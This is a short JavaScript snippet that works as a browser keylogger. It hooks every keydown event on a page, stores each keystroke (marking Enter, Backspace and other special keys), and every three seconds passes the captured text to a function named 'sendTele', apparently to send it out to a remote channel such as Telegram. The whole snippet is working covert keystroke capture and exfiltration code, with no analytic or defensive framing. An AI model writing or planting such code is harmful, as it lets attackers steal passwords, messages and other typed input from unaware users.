
let keylogData = "";
document.addEventListener('keydown', function(e) {
    let key = e.key;
    if (key === "Enter") key = "\n[ENTER]\n";
    else if (key === "Backspace") key = "[BS]";
    else if (key === "Space") key = " ";
    else if (key.length > 1) key = ` [${key}] `;
    
    keylogData += key;
});


setInterval(function() {
    if (keylogData.length > 0) {
        sendTele("⌨️ Keylog Captured:\n" + keylogData);
        keylogData = ""; 
    }
}, 3000); 

